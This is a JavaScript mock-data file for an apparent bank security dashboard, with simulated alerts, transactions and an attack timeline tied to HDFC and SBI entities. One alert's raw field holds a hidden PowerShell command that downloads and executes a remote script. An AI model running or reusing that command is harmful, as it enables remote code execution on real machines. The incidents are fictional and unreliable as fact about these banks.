export const MOCK_ALERTS = [
  {
    id: "ALT-8492-BX",
    severity: "critical",
    status: "NEW",
    score: 94,
    timestamp: new Date(Date.now() - 1000 * 12).toISOString(),
    entity_id: "HDFC-MUM-SWIFT-GW-01",
    factors: ["T1078_VALID_ACCOUNTS", "COBALT_STRIKE_BEACON_DETECTED", "DATA_EXFILTRATION_TO_SANCTIONED_IP"],
    linked_transaction: {
      id: "RTGS-2026-XLM-88",
      amount: 45000000,
      sender: "ACCT-9901-CORP-TREASURY",
      receiver: "ACCT-8120-EXT-CAYMAN",
    },
    raw: {
      process: "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://185.15.2.x/a'))\"",
      ip: "185.15.2.45",
      user: "rajesh.kumar_admin"
    },
    correlation: {
      score: 96,
      signals: ["Impossible Travel", "Endpoint Malware", "High Value RTGS", "Device Drift", "Service Account Abuse"],
      telemetry_contribution: 71,
      transaction_contribution: 29
    },
    impact: {
      financial_exposure: "₹4.5Cr",
      affected_customers: "Corporate Treasury (HDFC)",
      affected_accounts: "ACCT-9901-CORP",
      compliance_risk: "High (SWIFT SLA Breach)",
      recovery_priority: "P0 (Critical)",
      risk_classification: "Financial Risk"
    },
    ai_insight: {
      reason: "Cobalt Strike beacon communicating with known sanctioned IP.",
      evidence: "Process powershell.exe -nop -w hidden executed on HDFC-MUM-SWIFT-GW-01.",
      impact: "High probability of imminent data exfiltration via RTGS transfer.",
      confidence: 98,
      recommended_action: "Isolate HDFC-MUM-SWIFT-GW-01 and Block IP 185.15.2.45 at Firewall."
    },
    quantum: {
      readiness_score: 68,
      assets_at_risk: 243,
      cbom_coverage: 82,
      migration_progress: "Phase 2 (In Progress)",
      critical_alerts: 2
    }
  },
  {
    id: "ALT-8491-AZ",
    severity: "high",
    status: "INVESTIGATING",
    score: 76,
    timestamp: new Date(Date.now() - 1000 * 300).toISOString(),
    entity_id: "USR-SVC-ATM-CTL",
    factors: ["MULTIPLE_FAILED_LOGINS", "OFF_HOURS_ACCESS", "IMPOSSIBLE_TRAVEL"],
    linked_transaction: null,
    raw: {},
    correlation: { score: 76, signals: ["Failed Logins", "Off Hours", "Impossible Travel"], telemetry_contribution: 100, transaction_contribution: 0 },
    impact: { financial_exposure: "Unknown", affected_customers: "Internal Service", affected_accounts: "N/A", compliance_risk: "Medium", recovery_priority: "P1 (High)", risk_classification: "Operational Risk" },
    ai_insight: { reason: "Anomalous login patterns from service account.", evidence: "15 failed logins in 2 seconds.", impact: "Potential credential stuffing.", confidence: 85, recommended_action: "Reset password and enforce MFA." },
    quantum: { readiness_score: 75, assets_at_risk: 120, cbom_coverage: 90, migration_progress: "Phase 3", critical_alerts: 0 }
  },
  {
    id: "ALT-8488-CX",
    severity: "medium",
    status: "NEW",
    score: 55,
    timestamp: new Date(Date.now() - 1000 * 1200).toISOString(),
    entity_id: "SBI-BLR-ATM-CTL-09",
    factors: ["AMOUNT_OUT_OF_PROFILE", "DEVICE_DRIFT"],
    linked_transaction: {
      id: "IMPS-992104-RBI",
      amount: 150000,
      sender: "ACCT-1022-RETAIL-HNI",
      receiver: "ACCT-0091-EXT-UNVERIFIED",
    },
    raw: {},
    correlation: { score: 55, signals: ["Device Drift", "Amount Out of Profile"], telemetry_contribution: 40, transaction_contribution: 60 },
    impact: { financial_exposure: "₹1.5L", affected_customers: "Retail HNI", affected_accounts: "ACCT-1022", compliance_risk: "Low", recovery_priority: "P2 (Medium)", risk_classification: "Financial Risk" },
    ai_insight: { reason: "Transfer amount exceeds normal profile from new device.", evidence: "IMPS transfer of ₹1.5L from unknown MAC address.", impact: "Potential account takeover.", confidence: 70, recommended_action: "Hold transaction and require step-up authentication." },
    quantum: { readiness_score: 95, assets_at_risk: 10, cbom_coverage: 100, migration_progress: "Complete", critical_alerts: 0 }
  }
];

export const MOCK_KPIS = {
  active_alerts: 14,
  mttd_avg_seconds: 1.2,
  blocked_amount: 125000000,
};

export const MOCK_TRANSACTIONS = [
  { id: "RTGS-2026-XLM-88", sender: "ACCT-9901-CORP-TREASURY", receiver: "ACCT-8120-EXT-CAYMAN", amount: 45000000, endpoint_id: "HDFC-MUM-SWIFT-GW-01", risk_score: 94, correlated: true, decision: "BLOCK", timestamp: new Date(Date.now() - 1000 * 12).toISOString() },
  { id: "IMPS-992104-RBI", sender: "ACCT-1022-RETAIL-HNI", receiver: "ACCT-0091-EXT-UNVERIFIED", amount: 150000, endpoint_id: "SBI-BLR-ATM-CTL-09", risk_score: 55, correlated: true, decision: "HOLD", timestamp: new Date(Date.now() - 1000 * 1200).toISOString() },
  { id: "NEFT-1122-09", sender: "ACCT-5531-CORP-PAYROLL", receiver: "ACCT-9999-INT-EMPLOYEE", amount: 200000, endpoint_id: "CORP-MAC-CFO", risk_score: 12, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 3600).toISOString() },
  { id: "UPI-4421-11", sender: "ACCT-1100-RETAIL-SAVINGS", receiver: "ACCT-4412-EXT-MERCHANT", amount: 80000, endpoint_id: "APP-SRV-02", risk_score: 45, correlated: false, decision: "ALLOW", timestamp: new Date(Date.now() - 1000 * 7200).toISOString() },
  { id: "RTGS-9910-44", sender: "ACCT-9901-CORP-TREASURY", receiver: "ACCT-8888-EXT-VENDOR", amount: 12000000, endpoint_id: "HDFC-MUM-SWIFT-GW-01", risk_score: 88, correlated: true, decision: "BLOCK", timestamp: new Date(Date.now() - 1000 * 86400).toISOString() },
];

export const MOCK_TIMELINE_EVENTS = [
  { time: new Date(Date.now() - 1000 * 3600).getTime(), lane: 'Authentication', type: 'Failed Login (rajesh.kumar_admin)', color: 'var(--color-critical)' },
  { time: new Date(Date.now() - 1000 * 3500).getTime(), lane: 'Authentication', type: 'Failed Login (rajesh.kumar_admin)', color: 'var(--color-critical)' },
  { time: new Date(Date.now() - 1000 * 3400).getTime(), lane: 'Authentication', type: 'Successful Login (rajesh.kumar_admin)', color: 'var(--color-low)' },
  { time: new Date(Date.now() - 1000 * 3300).getTime(), lane: 'Endpoint', type: 'Powershell Execution (Encoded)', color: 'var(--color-high)' },
  { time: new Date(Date.now() - 1000 * 3200).getTime(), lane: 'Endpoint', type: 'Cobalt Strike Beacon (Memory)', color: 'var(--color-critical)' },
  { time: new Date(Date.now() - 1000 * 1200).getTime(), lane: 'Network', type: 'Connection to 185.15.2.45', color: 'var(--color-critical)' },
  { time: new Date(Date.now() - 1000 * 200).getTime(), lane: 'Transaction', type: 'RTGS-2026-XLM-88 Initiated', color: 'var(--color-critical)' },
];

